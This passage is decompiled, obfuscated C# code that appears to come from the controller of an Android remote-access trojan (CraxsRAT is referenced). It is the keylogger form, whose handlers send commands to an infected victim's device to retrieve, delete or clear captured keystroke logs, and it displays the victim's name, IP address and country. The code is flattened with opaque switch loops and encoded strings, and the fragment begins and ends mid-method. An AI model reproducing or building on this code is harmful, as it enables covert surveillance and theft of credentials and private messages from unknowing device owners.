              this.clinameinfo.Text = EXGuarder.\u0033B173F10 + ((Data._Closure\u0024__39\u002D12) ((Microphone) this).classClient).ClientName + Strings.Space(2) + EXGuarder.\u00363142668 + ((Data) ((Microphone) this).classClient).ClientAddressIP + Strings.Space(2) + EXGuarder.\u0035D624C35 + ((Data._Closure\u0024__39\u002D11) ((Microphone) this).classClient).Country;
              num3 = (int) num4 * -2124490672 ^ 1085522452;
              continue;
            default:
              goto label_12;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_12:
      this.Text = ((Ports) this).Title;
label_13:
      int num5 = 1745218824;
      while (true)
      {
        uint num6;
        switch ((num6 = (uint) ~~---~num5) % 4U)
        {
          case 0:
            this.SaveAsToolStripMenuItem.Visible = true;
            this.TOpacity.Interval = Settings.T_Interval;
            this.TOpacity.Enabled = true;
            num5 = (int) num6 * 171937742 ^ -485972134;
            continue;
          case 1:
            this.SpyStyle();
            this.SaveToolStripMenuItem.Visible = true;
            num5 = (int) num6 * -1381778077 ^ -2006031928;
            continue;
          case 2:
            goto label_13;
          case 3:
            goto label_15;
          default:
            goto label_10;
        }
      }
label_15:
      return;
label_10:;
    }

    private void getbtn_click(object sender, EventArgs e)
    {
      if (((Ports) this).IsActive)
        goto label_8;
label_1:
      int num1 = -1721878346;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~num1 ^ ~---199816758 ^ 1126872240) - 75568753 * -1433451389 * -1984846921 + -735068315 * 1294095691 ^ 806246647)) % 7U)
        {
          case 0:
            goto label_8;
          case 1:
            goto label_5;
          case 2:
            int num3 = (int) Interaction.MsgBox((object) EXGuarder.\u003132C330C);
            num1 = (int) num2 * 390620101 ^ -736500057;
            continue;
          case 3:
            goto label_4;
          case 5:
            int num4 = (int) Interaction.MsgBox((object) EXGuarder.\u003344A325E);
            num1 = (int) num2 * -1668697501 ^ -796917650;
            continue;
          case 6:
            goto label_1;
          default:
            goto label_9;
        }
      }
label_5:
      return;
label_4:
      return;
label_9:
      if (((Microphone) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((Microphone) this).classClient).Keys.Split(':');
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        ((Microphone) this).classClient.SendMessage(new object[4]
        {
          (object) ((Microphone) this).Client,
          (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003752A5200 + this.combologs.Text + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Microphone) this).classClient).ClientRemoteAddress),
          (object) Codes.Encoding().GetBytes(EXGuarder.\u0037267040C),
          (object) ((Microphone) this).classClient
        });
        this.loadinglogs.Enabled = true;
        this.loadinglogs.Visible = true;
        return;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_12:
        int num5 = -1844558539;
        while (true)
        {
          uint num6;
          switch ((num6 = (uint) ((~num5 ^ ~---199816758 ^ 1126872240) - 75568753 * -1433451389 * -1984846921 + -735068315 * 1294095691 ^ 806246647)) % 3U)
          {
            case 0:
              goto label_12;
            case 1:
              goto label_3;
            case 2:
              ProjectData.ClearProjectError();
              num5 = (int) num6 * -1303707234 ^ -1848223450;
              continue;
            default:
              goto label_16;
          }
        }
label_3:
        return;
label_16:
        return;
      }
label_8:
      num1 = !(this.combologs.Text.Length < 1 | this.combologs.Text == null) ? -1522348751 : (num1 = -1510389180);
      goto label_2;
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      if (((Ports) this).IsActive)
        goto label_6;
label_1:
      int num1 = 1966883887;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) -(-1564464640 - ~~(num2 * 2105494625 * 1127105535))) % 7U)
        {
          case 0:
            goto label_14;
          case 1:
            if (MessageBox.Show(EXGuarder.\u0033402401D, EXGuarder.\u00331221433, MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
              num1 = -464333883;
              continue;
            }
            goto label_22;
          case 2:
            goto label_9;
          case 3:
            goto label_6;
          case 4:
            goto label_1;
          case 6:
            int num4 = (int) Interaction.MsgBox((object) EXGuarder.\u0035A2A7750);
            num1 = (int) num3 * -374159361 ^ 28454896;
            continue;
          default:
            goto label_10;
        }
      }
label_14:
      return;
label_22:
      return;
label_9:
      int num5 = (int) Interaction.MsgBox((object) EXGuarder.\u00338230701);
      return;
label_10:
      if (((Microphone) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((Microphone) this).classClient).Keys.Split(':');
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        object[] ParametersObjects = new object[4]
        {
          (object) ((Microphone) this).Client,
          Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033062550C), Codes.BSEN(this.combologs.Text)), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET), (object) strArray[0]), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET), (object) strArray[1]), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET), (object) SMSManager.Lockscreen), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET), (object) Conversions.ToString(0)), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET), (object) Conversions.ToString(0)), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY), (object) Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET), (object) ((Data) ((Microphone) this).classClient).ClientRemoteAddress),
          (object) Codes.Encoding().GetBytes(EXGuarder.\u00376262070),
          (object) ((Microphone) this).classClient
        };
label_12:
        int num6 = 893708573;
        while (true)
        {
          int num7 = num6;
          uint num8;
          switch ((num8 = (uint) -(-1564464640 - ~~(num7 * 2105494625 * 1127105535))) % 4U)
          {
            case 0:
              this.combologs.Text = EXGuarder.\u0036A266F24;
              num6 = (int) num8 * -1726688361 ^ -959505337;
              continue;
            case 1:
              goto label_4;
            case 2:
              goto label_12;
            case 3:
              ((Microphone) this).classClient.SendMessage(ParametersObjects);
              num6 = (int) num8 * -2138932380 ^ -1434155892;
              continue;
            default:
              goto label_3;
          }
        }
label_4:
        return;
label_3:
        return;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_19:
        int num9 = -1513410783;
        while (true)
        {
          int num10 = num9;
          uint num11;
          switch ((num11 = (uint) -(-1564464640 - ~~(num10 * 2105494625 * 1127105535))) % 3U)
          {
            case 0:
              goto label_19;
            case 1:
              ProjectData.ClearProjectError();
              num9 = (int) num11 * 224542067 ^ 1563867509;
              continue;
            case 2:
              goto label_23;
            default:
              goto label_24;
          }
        }
label_23:
        return;
label_24:
        return;
      }
label_6:
      num1 = !(this.combologs.Text.Length < 1 | this.combologs.Text == null) ? -1026970452 : (num1 = 516263891);
      goto label_2;
    }

    public void Done(object[] objs)
    {
      if (!this.offlinetext.InvokeRequired)
        goto label_7;
label_1:
      int num1 = -1263047214;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (((~num1 + (-~~-1049747823 - -(6716042 ^ 822501138 ^ 1039273281)) ^ (-603094112 * 1896515297 ^ -883462730 ^ 1437292670) + -270728571 * 2020819755) * -944262361 + --1382390715) * 1979317851)) % 6U)
        {
          case 0:
            goto label_3;
          case 1:
            // ISSUE: method pointer
            this.offlinetext.Invoke((Delegate) new Keylogger((object) this, __methodptr(Done)), (object) objs);
            num1 = (int) num2 * 1941004598 ^ 525735209;
            continue;
          case 2:
            this.offlinetext.ScrollToCaret();
            num1 = (int) num2 * -1135799828 ^ -388339314;
            continue;
          case 3:
            goto label_7;
          case 4:
            goto label_1;
          case 5:
            this.offlinetext.Select();
            num1 = (int) num2 * 1735571748 ^ -719963545;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_7:
      this.offlinetext.AppendText(Conversions.ToString(objs[0]));
      this.offlinetext.SelectionStart = Strings.Len(this.offlinetext.Text);
      num1 = 487187963;
      goto label_2;
    }

    public void cleait()
    {
      if (!this.offlinetext.InvokeRequired)
        goto label_6;
label_1:
      int num1 = 966602629;
label_2:
      Keylogger.clearold method;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~~~-(num1 - (~-(-1904858025 - -1322440347) - (100595905 - 1078175858 + (-1071051253 - 839078163) + (~-79333515 ^ ~-1870491372)) + -454080017) ^ ~-~(909828583 ^ -307278143))) % 8U)
        {
          case 0:
            this.offlinetext.Invoke((Delegate) method, new object[0]);
            num1 = (int) num2 * -500256333 ^ -2026644602;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            goto label_6;
          case 4:
            method = (Keylogger.clearold) new Keylogger.OffLOG(this.cleait);
            num1 = (int) num2 * 865075603 ^ -2080291491;
            continue;
          case 5:
            num1 = (int) num2 * 1430442057 ^ 1310543999;
            continue;
          case 6:
            this.loadinglogs.Visible = false;
            num1 = (int) num2 * -221644271 ^ 809474518;
            continue;
          case 7:
            this.offlinetext.Clear();
            num1 = (int) num2 * -2000200166 ^ -1935239948;
            continue;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:
      return;
label_6:
      this.loadinglogs.Enabled = false;
      num1 = 158208951;
      goto label_2;
    }

    private void Button3_Click(object sender, EventArgs e)
    {
      try
      {
        // ISSUE: reference to a compiler-generated field
        if (Directory.Exists(((Data._Closure\u0024__39\u002D12) ((Microphone) this).classClient).FolderUSER + EXGuarder.\u00342783802))
          goto label_5;
label_1:
        int num1 = -973089869;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -(~(~-((-597327260 ^ 1518473961) + (154803029 + 767115139)) - ~num2) + -980964055 * (1609057614 - 1745696866))) % 4U)
          {
            case 0:
              goto label_5;
            case 1:
              // ISSUE: reference to a compiler-generated field
              Directory.CreateDirectory(((Data._Closure\u0024__39\u002D12) ((Microphone) this).classClient).FolderUSER + EXGuarder.\u00342783802);
              num1 = (int) num3 * 1976376746 ^ -1160506444;
              continue;
            case 2:
              goto label_1;
            case 3:
              goto label_3;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:
        return;
label_5:
        // ISSUE: reference to a compiler-generated field
        Process.Start(((Data._Closure\u0024__39\u002D12) ((Microphone) this).classClient).FolderUSER + EXGuarder.\u00342783802);
        num1 = -1107386867;
        goto label_2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Delbtn_Click(object sender, EventArgs e)
    {
      if (((Ports) this).IsActive)
        goto label_4;
label_1:
      int num1 = -256882474;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((--(num1 * 910595379) + 2045596850) * -1352611939 - -629649535)) % 7U)
        {
          case 0:
            goto label_21;
          case 2:
            int num3 = (int) Interaction.MsgBox((object) EXGuarder.\u0035D742107);
            num1 = (int) num2 * -445130393 ^ 1780639815;
            continue;
          case 3:
            goto label_1;
          case 4:
            goto label_4;
          case 5:
            int num4 = (int) Interaction.MsgBox((object) EXGuarder.\u003182D121C);
            num1 = (int) num2 * -731968143 ^ -91292419;
            continue;
          case 6:
            goto label_19;
          default:
            goto label_8;
        }
      }
label_21:
      return;
label_19:
      return;
label_8:
      if (((Microphone) this).classClient == null)
        return;
      try
      {
        try
        {
          string text = EXGuarder.\u0030E476A4C;
label_11:
          int num5 = -892413179;
          string language;
          while (true)
          {
            uint num6;
            switch ((num6 = (uint) ((--(num5 * 910595379) + 2045596850) * -1352611939 - -629649535)) % 9U)
            {
              case 0:
                num5 = (int) num6 * -1944326847 ^ 1507304305;
                continue;
              case 1:
                language = RegistryHandler.Get_Language();
                int num7 = Operators.CompareString(language, EXGuarder.\u00306386D42, false) == 0 ? -882328186 : (num7 = 1905787725);
                num5 = num7 ^ (int) num6 * -603761404;
                continue;
              case 2:
                text = EXGuarder.\u00328185632;
                num5 = 127434632;
                continue;
              case 3:
                int num8 = Operators.CompareString(language, EXGuarder.\u003420A4A69, false) != 0 ? 1343564512 : (num8 = 1967222500);
                num5 = num8 ^ (int) num6 * -645839758;
                continue;
              case 5:
                goto label_13;
              case 6:
                text = EXGuarder.\u0033B195D6D;
                num5 = (int) num6 * -690415976 ^ 192986440;
                continue;
              case 7:
                int num9;
                num5 = num9 = MessageBox.Show(text, EXGuarder.\u003160A7508, MessageBoxButtons.YesNo) == DialogResult.Yes ? -1236246841 : (num9 = 1467653848);
                continue;
              case 8:
                goto label_11;
              default:
                goto label_23;
            }
          }
label_13:
          return;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
label_23:
        string[] strArray = ((Data) ((Microphone) this).classClient).Keys.Split(':');
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        ((Microphone) this).classClient.SendMessage(new object[4]
        {
          (object) ((Microphone) this).Client,
          (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00321670166 + this.combologs.Text + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Microphone) this).classClient).ClientRemoteAddress),
          (object) Codes.Encoding().GetBytes(EXGuarder.\u003223A4210),
          (object) ((Microphone) this).classClient
        });
label_24:
        int num10 = -1097576738;
        while (true)
        {
          uint num11;
          switch ((num11 = (uint) ((--(num10 * 910595379) + 2045596850) * -1352611939 - -629649535)) % 3U)
          {
            case 0:
              goto label_6;
            case 1:
              this.combologs.Items.Remove((object) this.combologs.Text);
              this.combologs.Text = EXGuarder.\u00325333709;
              num10 = (int) num11 * -695699128 ^ -851345128;
              continue;
            case 2:
              goto label_24;
            default:
              goto label_3;
          }
        }
label_6:
        return;
label_3:
        return;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        return;
      }
label_4:
      num1 = !(this.combologs.Text.Length < 1 | this.combologs.Text == null) ? 1836273221 : (num1 = -23786453);
      goto label_2;
    }

    private void Button3_Click_1(object sender, EventArgs e)
    {
      if (((Microphone) this).classClient == null)
        return;
      try
      {
        try
        {
          string text = EXGuarder.\u0031047324E;
label_3:
          int num1 = -773256346;
          while (true)
          {
            int num2 = num1;
            uint num3;
            string language;
            switch ((num3 = (uint) -(-1542270818 * 1250876271 - (~(num2 ^ (~-222633098 - (--893753409 ^ -372808877 * 2137743135) ^ -761667423 - 1534671967 + -751636744 ^ -(2003596295 ^ 1993276490)) + ~(-(-1850804063 * 1068222139) + (769710884 ^ -898775295) * 144770119)) ^ ~(2062714922 - 529877049 - -720120923 * -1156396595)) * -867149369)) % 10U)
            {
              case 1:
                language = RegistryHandler.Get_Language();
                num1 = (int) num3 * -1325538855 ^ 64145177;
                continue;
              case 2:
                num1 = (int) num3 * 1163667814 ^ -1312558773;
                continue;
              case 3:
                int num4 = Operators.CompareString(language, EXGuarder.\u0033F1A344A, false) != 0 ? -1747597873 : (num4 = -1034187387);
                num1 = num4 ^ (int) num3 * -335469428;
                continue;
              case 4:
                text = EXGuarder.\u0034B4E4B62;
                num1 = (int) num3 * -2017921864 ^ 454194261;
                continue;
              case 5:
                int num5 = Operators.CompareString(language, EXGuarder.\u00354554476, false) == 0 ? -881920968 : (num5 = 978053759);
                num1 = num5 ^ (int) num3 * 315931477;
                continue;
              case 6:
                text = EXGuarder.\u0033E5F6C38;
                num1 = 2031904331;
                continue;
              case 7:
                goto label_3;
              case 8:
                int num6;
                num1 = num6 = MessageBox.Show(text, EXGuarder.\u003556E1B28, MessageBoxButtons.YesNo) == DialogResult.Yes ? -1270193775 : (num6 = 591086726);
                continue;
              case 9:
                goto label_14;
              default:
                goto label_16;
            }
          }
label_14:
          return;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
label_16:
        string[] strArray = ((Data) ((Microphone) this).classClient).Keys.Split(':');
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        object[] ParametersObjects = new object[4]
        {
          (object) ((Microphone) this).Client,
          (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00358250F4B + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Microphone) this).classClient).ClientRemoteAddress),
          (object) Codes.Encoding().GetBytes(EXGuarder.\u00338305030),
          (object) ((Microphone) this).classClient
        };
label_17:
        int num7 = -722910480;
        while (true)
        {
          int num8 = num7;
          uint num9;
          switch ((num9 = (uint) -(-1542270818 * 1250876271 - (~(num8 ^ (~-222633098 - (--893753409 ^ -372808877 * 2137743135) ^ -761667423 - 1534671967 + -751636744 ^ -(2003596295 ^ 1993276490)) + ~(-(-1850804063 * 1068222139) + (769710884 ^ -898775295) * 144770119)) ^ ~(2062714922 - 529877049 - -720120923 * -1156396595)) * -867149369)) % 4U)
          {
            case 0:
              goto label_17;
            case 1:
              goto label_10;
            case 2:
              this.combologs.Text = EXGuarder.\u00355396B62;
              num7 = (int) num9 * 214394961 ^ 1277447008;
              continue;
            case 3:
              ((Microphone) this).classClient.SendMessage(ParametersObjects);
              this.combologs.Items.Clear();
              num7 = (int) num9 * 1678378607 ^ 1134038906;
              continue;
            default:
              goto label_5;
          }
        }
label_10:
        return;
label_5:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Backallbtn_Click(object sender, EventArgs e)
    {
      if (this.combologs.Items.Count < 1)
      {
label_1:
        int num1 = 1531098808;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -((-num1 ^ ((-806856417 ^ 2041265289) - -(1843372567 * 995208059)) * 817831281) * -1736011587 ^ ~2082508065 - -605340478)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              int num3 = (int) Interaction.MsgBox((object) EXGuarder.\u00344016B0F);
              num1 = (int) num2 * 1117527438 ^ -915913747;
              continue;
            case 2:
              goto label_12;
            default:
              goto label_4;
          }
        }
label_12:
        return;
      }
label_4:
      if (((Microphone) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((Microphone) this).classClient).Keys.Split(':');
label_6:
        int num4 = 826225555;
        object[] ParametersObjects;
        while (true)
        {
          uint num5;
          switch ((num5 = (uint) -((-num4 ^ ((-806856417 ^ 2041265289) - -(1843372567 * 995208059)) * 817831281) * -1736011587 ^ ~2082508065 - -605340478)) % 3U)
          {
            case 0:
              goto label_6;
            case 1:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ParametersObjects = new object[4]
              {
                (object) ((Microphone) this).Client,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033A15572B + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Microphone) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u00310720907),
                (object) ((Microphone) this).classClient
              };
              num4 = (int) num5 * 1799545582 ^ -1684612934;
              continue;
            default:
              goto label_10;
          }
        }
label_10:
        ((Microphone) this).classClient.SendMessage(ParametersObjects);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Searchbtn_Click(object sender, EventArgs e)
    {
      if (!string.IsNullOrEmpty(this.offlinetext.Text))
        goto label_10;
label_1:
      int num1 = -1133695946;
label_2:
      bool flag;
      int start;
      string text1;
      string text2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-~~(~num1 - (~1725641000 + -1987740424 - (~-1491996699 ^ 237200680)) * 1734288551) - 1811426837)) % 15U)
        {
          case 0:
            ((Ports) this).lastFoundIndex = start;
            this.offlinetext.Select(start, text2.Length);
            this.offlinetext.SelectionColor = Color.White;
            num1 = (int) num2 * -2000575895 ^ -1563955870;
            continue;
          case 1:
            this.offlinetext.ScrollToCaret();
            num1 = (int) num2 * 1955593955 ^ -1040231554;
            continue;
          case 2:
            goto label_10;
          case 3:
            int num3;
            num1 = num3 = !flag ? -1449803509 : (num3 = -490427724);
            continue;
          case 4:
            goto label_3;
          case 5:
            int num4 = start < 0 ? -1418303509 : (num4 = -1272501688);
            num1 = num4 ^ (int) num2 * 41836291;
            continue;
          case 6:
            flag = true;
            text2 = this.searchtext.Text;
            text1 = this.offlinetext.Text;
            num1 = 240673261;
            continue;
          case 7:
            int num5 = ((Ports) this).lastFoundIndex >= start ? -2050353753 : (num5 = 1448820941);
            num1 = num5 ^ (int) num2 * -1794157931;
            continue;
          case 8:
            goto label_1;
          case 9:
            start = text1.IndexOf(text2, StringComparison.CurrentCultureIgnoreCase);
            num1 = (int) num2 * -1951353675 ^ -1812028635;
            continue;
          case 10:
            flag = false;
            num1 = (int) num2 * 1938676519 ^ -522670505;
            continue;
          case 11:
            CraxsAlert.Showinformation(EXGuarder.\u00368266B67);
            num1 = (int) num2 * -1919926781 ^ 184244888;
            continue;
          case 12:
            CraxsAlert.Showinformation(EXGuarder.\u00376445D0D);
            num1 = (int) num2 * -726432683 ^ 1213079002;
            continue;
          case 13:
            int num6 = ((Ports) this).lastFoundIndex != start ? -1039021172 : (num6 = -199000878);
            num1 = num6 ^ (int) num2 * 1536779369;
            continue;
          case 14:
            CraxsAlert.Showinformation(EXGuarder.\u00307097923);
            num1 = (int) num2 * 514140460 ^ -2110557713;
            continue;
          default:
            goto label_17;
        }
      }
label_3:
      return;
label_17:
      return;
label_10:
      num1 = !string.IsNullOrEmpty(this.searchtext.Text) ? -672901367 : (num1 = 178739418);
      goto label_2;
    }

    private void Clearsrchbtn_Click(object sender, EventArgs e)
    {
      this.searchtext.Text = EXGuarder.\u0036071676A;
      this.offlinetext.SelectAll();
      this.offlinetext.SelectionColor = Color.Black;
label_1:
      int num1 = 374262344;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(num1 ^ -~(339272082 * 816524821 - --833520921) + ~(2147149249 * ~-390557372 ^ 374096311)) - (---1959450622 ^ ~-1360656066) - --373751619 * 396616493)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            this.offlinetext.SelectionStart = 0;
            num1 = (int) num2 * 356184102 ^ -1396906595;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      ((Ports) this).lastFoundIndex = -1;
    }

    private void Searchtext_TextChanged(object sender, EventArgs e)
    {
      ((Ports) this).searchbefore.Clear();
label_1:
      int num1 = -832363285;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) --~(~(num1 ^ ~-1234425767 + -((522162004 ^ -87301034) - 1428880828 ^ -297898379 * 1189628889)) ^ ~(-1832633463 * -872120129))) % 6U)
        {
          case 0:
            this.clearsrchbtn.Visible = true;
            num1 = (int) num2 * -1983980534 ^ -1035688034;
            continue;
          case 1:
            this.clearsrchbtn.Visible = false;
            num1 = -1651609122;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -867150650 ^ 1635757408;
            continue;
          case 4:
            int num3 = string.IsNullOrEmpty(this.searchtext.Text) ? 383577910 : (num3 = 330036575);
            num1 = num3 ^ (int) num2 * -1682195280;
            continue;
          case 5:
            goto label_3;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
      if (((Microphone) this).classClient == null)
        return;
label_1:
      int num1 = -1734649676;
      object[] ParametersObjects;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -((num1 * 430869383 + (~871847712 - (579035572 + 637036935) + (640434591 - -2041425784 - (-649182290 - 2212369))) * -698979275 - (--798794640 - (1278629257 ^ 904989841) ^ 1955664145 * -1681189738 ^ --848202017)) * -1663837691)) % 4U)
        {
          case 0:
            ((Microphone) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num2 * 963704868 ^ -64696295;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Data._Closure\u0024__) ((Microphone) this).classClient).myClient,
              (object) (Client.KeysClient8 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Client.Keylogger + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00362615C03),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0031E3A0172),
              (object) ((Microphone) this).classClient
            };
            num1 = (int) num2 * 30708212 ^ -831168697;
            continue;
          case 2:
            goto label_6;
          case 3:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void Exitbtn_Click(object sender, EventArgs e)
    {
      if (((Microphone) this).classClient == null)
        return;
label_1:
      int num1 = 1114944694;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-~(~(num1 - ((1670729683 - 535539454) * 1151019531 * -1071278163 * -2032725815 ^ 1041149571 * (1053547673 - 1130105187 ^ -1416418125 * 1462799585) ^ -1938300071 - (975559572 ^ 860143091 * 348866317))) ^ 29819015) ^ -2125722061)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            // ISSUE: reference to a compiler-generated field
            ((Microphone) this).classClient.SendMessage(new object[4]
            {
              (object) ((Microphone) this).Client,
              (object) (Client.KeysClient9 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Client.Keylogger),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0032B196C02),
